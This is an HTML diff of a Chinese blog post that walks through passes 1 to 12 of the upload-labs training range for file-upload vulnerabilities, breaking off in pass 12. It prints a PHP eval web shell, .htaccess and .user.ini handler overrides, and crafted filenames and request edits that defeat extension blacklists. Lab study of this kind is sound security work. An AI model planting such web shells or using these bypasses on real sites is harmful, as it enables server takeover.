@@ -148,6 +148,269 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://x4297.github.io/2022/02/14/upload-labs%E8%AE%B0%E5%BD%95/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/Yuumi.jpg">
+      <meta itemprop="name" content="x4297">
+      <meta itemprop="description" content="开摆!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="x4297's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/02/14/upload-labs%E8%AE%B0%E5%BD%95/" class="post-title-link" itemprop="url">upload-labs记录</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-02-14 16:49:44" itemprop="dateCreated datePublished" datetime="2022-02-14T16:49:44+08:00">2022-02-14</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-23 20:08:06" itemprop="dateModified" datetime="2022-04-23T20:08:06+08:00">2022-04-23</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>upload-labs是一个总结了文件上传漏洞的靶场，可以在github上下载源码<a target="_blank" rel="noopener" href="https://github.com/c0ny1/upload-labs">https://github.com/c0ny1/upload-labs</a></p>
+<p>本次练习将网站搭建在本地虚拟机上，使用 phpstudy</p>
+<hr>
+<p>有一些文件上传漏洞需要一些特定的配置，比如 .user.ini，我不是很懂这些配置，有一些场景无法成功复现，所以就直接整理网上的答案了</p>
+<p><strong>本文纯文字，无配图，配合搭建好的upload-labs环境或者源码食用更佳（可以当作一个备忘录，碰到涉及的情景但是忘记怎么做可以看看）</strong></p>
+<h1 id="pass-01（前端js验证）"><a href="#pass-01（前端js验证）" class="headerlink" title="pass-01（前端js验证）"></a>pass-01（前端js验证）</h1><p> 前端白名单验证扩展名</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义允许上传的文件类型</span></span><br><span class="line"><span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>我们的目标是将小马或一句话木马传到网站上，再用蚁剑（github上可以下载）连接</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;kfc&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>蚁剑使用post方法比较方便，get可能有点问题</p>
+<h2 id="一、burp-suite-抓包，再修改文件扩展名"><a href="#一、burp-suite-抓包，再修改文件扩展名" class="headerlink" title="一、burp suite 抓包，再修改文件扩展名"></a>一、burp suite 抓包，再修改文件扩展名</h2><p>将一句话木马的文件扩展名改为白名单之一，如 ma.jpg，打开burpsuite的拦截功能，然后在网页中选择文件并上传 ma.jpg，抓到包之后</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;ma.jpg&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>filename 扩展名改为 php</p>
+<p>成功上传 ma.php</p>
+<p>上传后会在 img 标签中显示上传的路径</p>
+<h2 id="二、浏览器控制台覆盖检查函数（f12中修改js代码）"><a href="#二、浏览器控制台覆盖检查函数（f12中修改js代码）" class="headerlink" title="二、浏览器控制台覆盖检查函数（f12中修改js代码）"></a>二、浏览器控制台覆盖检查函数（f12中修改js代码）</h2><p>相关检查函数如下</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> file = <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span></span><br><span class="line"><span class="javascript">            alert(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//定义允许上传的文件类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span></span><br><span class="line"><span class="javascript">        <span class="comment">//提取上传文件的类型</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> ext_name = file.substring(file.lastIndexOf(<span class="string">&quot;.&quot;</span>));</span></span><br><span class="line"><span class="javascript">        <span class="comment">//判断上传文件类型是否允许上传</span></span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (allow_ext.indexOf(ext_name) == -<span class="number">1</span>) &#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span></span><br><span class="line"><span class="javascript">            alert(errMsg);</span></span><br><span class="line"><span class="javascript">            <span class="keyword">return</span> <span class="literal">false</span>;</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在 script 标签中的代码直接在 element 中修改没有用，网上查到了一个办法，在 console 中覆盖这个函数</p>
+<p>查看js代码可以知道，函数名是 checkFile ，如果文件扩展名不在白名单中会返回 false，那我们直接将这个函数改为直接返回true即可</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title">checkFile</span>() &#123; <span class="keyword">return</span> <span class="type">true</span>; &#125;</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以正常上传 ma.php 了</p>
+<h1 id="pass-02（MIME）"><a href="#pass-02（MIME）" class="headerlink" title="pass-02（MIME）"></a>pass-02（MIME）</h1><p>pass-01的方法一可以使用</p>
+<p>检查的应该是这一行</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-<span class="built_in">Type</span>: <span class="built_in">image</span>/jpeg</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-03（黑名单，不常见扩展名绕过）"><a href="#pass-03（黑名单，不常见扩展名绕过）" class="headerlink" title="pass-03（黑名单，不常见扩展名绕过）"></a>pass-03（黑名单，不常见扩展名绕过）</h1><p>上传文件后显示</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">提示：不允许上传<span class="string">.asp</span>,<span class="string">.aspx</span>,<span class="string">.php</span>,<span class="string">.jsp</span>后缀文件！</span><br></pre></td></tr></table></figure>
+
+<p>不过既然是黑名单，就可以先试试想办法绕过黑名单</p>
+<p>之后为了验证漏洞更加方便，就不上传一句话木马了，直接上传如下代码，运行 phpinfo 函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> phpinfo(); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>网上看来的</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php由于历史原因，部分解释器可能支持符合正则 <span class="regexp">/ph(p[2-7]?|t(ml)?)/</span> 的后缀，如 php <span class="regexp">/ php5 /</span> pht <span class="regexp">/ phtml /</span> shtml <span class="regexp">/ pwml /</span> phtm 等 可在禁止上传php文件时测试该类型。</span><br></pre></td></tr></table></figure>
+
+<p>试了一下</p>
+<p>php5 访问时 403，phtml 访问时直接把代码下载下来了。不把这个文件的内容当成php代码解析，应该和中间件的配置有关</p>
+<p>或者配合文件包含漏洞使用</p>
+<hr>
+<p>黑名单部分代码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br></pre></td></tr></table></figure>
+
+<p>先删除了末尾的空格，再删除了末尾的点，再删除一次空格，做到后面回过头来想到了，我们可以构造一个比较特殊的文件名（burpsuite 抓包修改）</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.php. .</span><br></pre></td></tr></table></figure>
+
+<p>这样可以上传成功，但是因为上传后的文件重命名了，扩展名使用代码运行时判断合法的扩展名，所以无法成功利用。使用上述文件名时 $file_ext = “.”，只有一个点，上传后windows自动把点去掉，就等于没有扩展名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.date(<span class="string">&quot;YmdHis&quot;</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).<span class="variable">$file_ext</span>;  <span class="comment">// img_path 中最后拼接上了 file_ext          </span></span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>)) &#123;</span><br><span class="line">        <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-04（-htaccess）"><a href="#pass-04（-htaccess）" class="headerlink" title="pass-04（.htaccess）"></a>pass-04（.htaccess）</h1><p>此关没有将上传的文件重命名，提示如下</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">本pass禁止上传.php|<span class="type">.php5</span>|<span class="type">.php4</span>|<span class="type">.php3</span>|<span class="type">.php2</span>|<span class="type">php1</span>|<span class="type">.html</span>|<span class="type">.htm</span>|<span class="type">.phtml</span>|<span class="type">.pHp</span>|<span class="type">.pHp5</span>|<span class="type">.pHp4</span>|<span class="type">.pHp3</span>|<span class="type">.pHp2</span>|<span class="type">pHp1</span>|<span class="type">.Html</span>|<span class="type">.Htm</span>|<span class="type">.pHtml</span>|<span class="type">.jsp</span>|<span class="type">.jspa</span>|<span class="type">.jspx</span>|<span class="type">.jsw</span>|<span class="type">.jsv</span>|<span class="type">.jspf</span>|<span class="type">.jtml</span>|<span class="type">.jSp</span>|<span class="type">.jSpx</span>|<span class="type">.jSpa</span>|<span class="type">.jSw</span>|<span class="type">.jSv</span>|<span class="type">.jSpf</span>|<span class="type">.jHtml</span>|<span class="type">.asp</span>|<span class="type">.aspx</span>|<span class="type">.asa</span>|<span class="type">.asax</span>|<span class="type">.ascx</span>|<span class="type">.ashx</span>|<span class="type">.asmx</span>|<span class="type">.cer</span>|<span class="type">.aSp</span>|<span class="type">.aSpx</span>|<span class="type">.aSa</span>|<span class="type">.aSax</span>|<span class="type">.aScx</span>|<span class="type">.aShx</span>|<span class="type">.aSmx</span>|<span class="type">.cEr</span>|<span class="type">.sWf</span>|<span class="type">.swf</span>后缀文件！</span><br></pre></td></tr></table></figure>
+
+<p>上传 .htaccess 文件，作用是覆盖 apache 的配置</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType <span class="built_in">application</span>/x-httpd-php .abcd</span><br></pre></td></tr></table></figure>
+
+<p>匹配扩展名，或者匹配文件名</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">&lt;FilesMatch <span class="string">&quot;phpinfo.jpg&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br><span class="line"></span><br><span class="line"><span class="section">&lt;/FilesMatch&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>在本地环境测试无法成功（答案来源于网络）</p>
+<p>网上有说要把 AllowOverride 改为 all 的，还要把 LoadModule rewrite_module modules/mod_rewrite.so 前面的注释符去掉，我都试过了，本地环境为 windows + phpstudy</p>
+<hr>
+<p>这关没有使用随机数拼上后缀名，而是直接使用上传的文件名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    	<span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再试一下</p>
+<figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.php. .</span><br></pre></td></tr></table></figure>
+
+<p>这次倒是成了，上传后文件名为 <code>phpinfo.php</code></p>
+<h1 id="pass-05（-user-ini）"><a href="#pass-05（-user-ini）" class="headerlink" title="pass-05（.user.ini）"></a>pass-05（.user.ini）</h1><p>github上面写的</p>
+<figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">插入一个新的<span class="keyword">Pass</span>-<span class="number">05</span>，其余<span class="keyword">Pass</span>编号依次往后递增</span><br></pre></td></tr></table></figure>
+
+<p>网上说也是上传配置文件，不过这次是php的，相当于覆盖全局的配置，或者说分布式配置</p>
+<p>文件名 <code>.user.ini</code> 内容如下</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">auto_prepend_file</span>=phpinfo.jpg</span><br></pre></td></tr></table></figure>
+
+<p>意思是 php文件自动 include phpinfo.jpg</p>
+<p>然后打开 upload 文件夹下本就有的 readme.php</p>
+<p>意料之中地在本地环境失败了</p>
+<hr>
+<p>这也是个不会改名的</p>
+<p>可以使用 <code>phpinfo.php. .</code> 绕过</p>
+<h1 id="pass-06（大小写）"><a href="#pass-06（大小写）" class="headerlink" title="pass-06（大小写）"></a>pass-06（大小写）</h1><p>相比之前几关少了 strtolower 函数转换成小写，所以可以改变扩展名中的部分字母大小写来绕过</p>
+<p>上传成功</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HTTP 500 - Internal<span class="built_in"> Server </span><span class="builtin-name">Error</span> 服务器内部错误</span><br></pre></td></tr></table></figure>
+
+<p>但是不知道哪配置错了，换 nginx 可以正常访问</p>
+<hr>
+<p>会使用合法后缀名来重命名</p>
+<h1 id="pass-07（末尾空格）"><a href="#pass-07（末尾空格）" class="headerlink" title="pass-07（末尾空格）"></a>pass-07（末尾空格）</h1><p>相比之前少了 trim 函数，没有删去文件名两头的空格</p>
+<p>windows中，重命名时，扩展名最后加空格，系统会自动去掉</p>
+<p>所以可以用burpsuite 上传文件时在将文件名最后加上空格</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Content-Dispositi<span class="symbol">on:</span> form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php&quot;</span></span><br><span class="line"></span><br><span class="line">=&gt; Content-Dispositi<span class="symbol">on:</span> form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;phpinfo.php &quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-08（末尾点）"><a href="#pass-08（末尾点）" class="headerlink" title="pass-08（末尾点）"></a>pass-08（末尾点）</h1><p>相比之前少了 deldot 函数，这不是php内置的函数，是作者自己写的，用于去除文件名末尾多余的 . 的</p>
+<p>. 和空格一样，windows会把文件名最后的点和空格自动去掉</p>
+<p>所以可以用burpsuite 上传文件时在将文件名最后加上点</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;phpinfo.php.&quot;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-09（-DATA）"><a href="#pass-09（-DATA）" class="headerlink" title="pass-09（::$DATA）"></a>pass-09（::$DATA）</h1><p>与前面相比，少了如下代码</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="regexp">//</span>去除字符串::<span class="variable">$DATA</span></span><br></pre></td></tr></table></figure>
+
+<p>文件名后面加上 ::$DATA ，windows系统上传后会自动去掉，可以通过原来的文件名访问（网上好像说和 NTFS 有关，不是很懂）</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Disposition: form-data; <span class="attribute">name</span>=<span class="string">&quot;upload_file&quot;</span>; <span class="attribute">filename</span>=<span class="string">&quot;phpinfo.php::<span class="variable">$data</span>&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问 upload/202202162245205952.php（重命名为随机名字） 即可</p>
+<h1 id="pass-10（末尾空格和点交替）"><a href="#pass-10（末尾空格和点交替）" class="headerlink" title="pass-10（末尾空格和点交替）"></a>pass-10（末尾空格和点交替）</h1><p>前面 <code>phpinfo.php. .</code> 的灵感来源</p>
+<p>先看看过滤空格和点以及转换大小写的代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&quot;.php&quot;</span>,<span class="string">&quot;.php5&quot;</span>,<span class="string">&quot;.php4&quot;</span>,<span class="string">&quot;.php3&quot;</span>,<span class="string">&quot;.php2&quot;</span>,<span class="string">&quot;.html&quot;</span>,<span class="string">&quot;.htm&quot;</span>,<span class="string">&quot;.phtml&quot;</span>,<span class="string">&quot;.pht&quot;</span>,<span class="string">&quot;.pHp&quot;</span>,<span class="string">&quot;.pHp5&quot;</span>,<span class="string">&quot;.pHp4&quot;</span>,<span class="string">&quot;.pHp3&quot;</span>,<span class="string">&quot;.pHp2&quot;</span>,<span class="string">&quot;.Html&quot;</span>,<span class="string">&quot;.Htm&quot;</span>,<span class="string">&quot;.pHtml&quot;</span>,<span class="string">&quot;.jsp&quot;</span>,<span class="string">&quot;.jspa&quot;</span>,<span class="string">&quot;.jspx&quot;</span>,<span class="string">&quot;.jsw&quot;</span>,<span class="string">&quot;.jsv&quot;</span>,<span class="string">&quot;.jspf&quot;</span>,<span class="string">&quot;.jtml&quot;</span>,<span class="string">&quot;.jSp&quot;</span>,<span class="string">&quot;.jSpx&quot;</span>,<span class="string">&quot;.jSpa&quot;</span>,<span class="string">&quot;.jSw&quot;</span>,<span class="string">&quot;.jSv&quot;</span>,<span class="string">&quot;.jSpf&quot;</span>,<span class="string">&quot;.jHtml&quot;</span>,<span class="string">&quot;.asp&quot;</span>,<span class="string">&quot;.aspx&quot;</span>,<span class="string">&quot;.asa&quot;</span>,<span class="string">&quot;.asax&quot;</span>,<span class="string">&quot;.ascx&quot;</span>,<span class="string">&quot;.ashx&quot;</span>,<span class="string">&quot;.asmx&quot;</span>,<span class="string">&quot;.cer&quot;</span>,<span class="string">&quot;.aSp&quot;</span>,<span class="string">&quot;.aSpx&quot;</span>,<span class="string">&quot;.aSa&quot;</span>,<span class="string">&quot;.aSax&quot;</span>,<span class="string">&quot;.aScx&quot;</span>,<span class="string">&quot;.aShx&quot;</span>,<span class="string">&quot;.aSmx&quot;</span>,<span class="string">&quot;.cEr&quot;</span>,<span class="string">&quot;.sWf&quot;</span>,<span class="string">&quot;.swf&quot;</span>,<span class="string">&quot;.htaccess&quot;</span>,<span class="string">&quot;.ini&quot;</span>);</span><br><span class="line"><span class="variable">$file_name</span> = trim(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line"><span class="variable">$file_name</span> = deldot(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line"><span class="variable">$file_ext</span> = strrchr(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line"><span class="variable">$file_ext</span> = strtolower(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line"><span class="variable">$file_ext</span> = str_ireplace(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line"><span class="variable">$file_ext</span> = trim(<span class="variable">$file_ext</span>); <span class="comment">//首尾去空</span></span><br></pre></td></tr></table></figure>
+
+<p>可以看到，他是按照 空格-点-空格 这个顺序来过滤的，我们只要构造一个字符串，使他过滤之后末尾还存在空格或者点就行</p>
+<p>还有个比较关键的点就是，保存的文件名和原来一样，而不是通过检测到的合法的扩展名拼接而成</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!in_array(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$file_name</span>;  <span class="comment">// 重要的点</span></span><br><span class="line"><span class="keyword">if</span> (move_uploaded_file(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>)) &#123;</span><br><span class="line">    	<span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;上传出错！&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    	<span class="variable">$msg</span> = <span class="string">&#x27;此文件类型不允许上传！&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="pass-11（双写绕过）"><a href="#pass-11（双写绕过）" class="headerlink" title="pass-11（双写绕过）"></a>pass-11（双写绕过）</h1><p>这关从文件名中删去一些关键字，不区分大小写</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = str_ireplace(<span class="variable">$deny_ext</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$file_name</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这种替换成空，而且只替换一次的，可以尝试双写绕过</p>
+<figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">phpinfo.pphphp</span><br><span class="line">替换后</span><br><span class="line">=&gt; info.php</span><br></pre></td></tr></table></figure>
+
+<p>这里有个小坑，在 php 的第二个 p 和 h之间插入php的话，过滤后是 hpp</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.phphpp</span>  =&gt;  <span class="selector-class">.hpp</span></span><br><span class="line"><span class="selector-class">.ph</span>(php)<span class="selector-tag">p</span>  <span class="comment">// 想象</span></span><br><span class="line">.(php)hpp  <span class="comment">// 现实</span></span><br></pre></td></tr></table></figure>
+
+<p>这样不行，这个函数估计是从左往右顺序检测关键字</p>
+<h1 id="pass-12（-00截断-get）"><a href="#pass-12（-00截断-get）" class="headerlink" title="pass-12（%00截断 get）"></a>pass-12（%00截断 get）</h1><p>关键代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.rand(<span class="number">10</span>, <span class="number">99</span>).date(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上传的路径一部分从 save_path 参数中获取，这意味着这部分是用户可控的</p>
+<p>%00截断的条件，网上的说法</p>
